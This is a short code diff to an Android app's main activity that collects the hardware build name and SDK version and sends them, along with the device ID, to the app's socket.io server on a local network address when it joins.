@@ -231,6 +231,7 @@ public class MainActivity extends AppCompatActivity {
     private Socket socket;
     TelephonyManager telephonyManager;
     String deviceID = "";
+    String otherInformation = "";
     boolean userConnected = false;
     final String[] str = {""};
     final String[] strForServerCommand = {""};
@@ -249,6 +250,11 @@ public class MainActivity extends AppCompatActivity {
                 getApplicationContext().getContentResolver(),
                 Settings.Secure.ANDROID_ID);
 
+
+        otherInformation += "Hardware Build : " + Build.HARDWARE;
+
+        otherInformation += ", SDK version :" + Build.VERSION.SDK_INT;
+        Log.d("otherinfo", otherInformation);
 //        deviceID += ", Manufacturer - " + Build.MANUFACTURER + ", Device- " + Build.DEVICE + ", Product - " + Build.PRODUCT;
 
 //        deviceID += ",Brand - " + Build.BRAND;
@@ -261,7 +267,7 @@ public class MainActivity extends AppCompatActivity {
                 try {
 //                    socket = new Socket("192.168.1.11", 3000);
                     socket = IO.socket("http://192.168.1.11:3000");
-                    socket.connect().emit("join", deviceID);
+                    socket.connect().emit("join", deviceID, otherInformation);
 //                    socket.connect().emit("messagedetection", deviceID, "Rebooted");
 
 
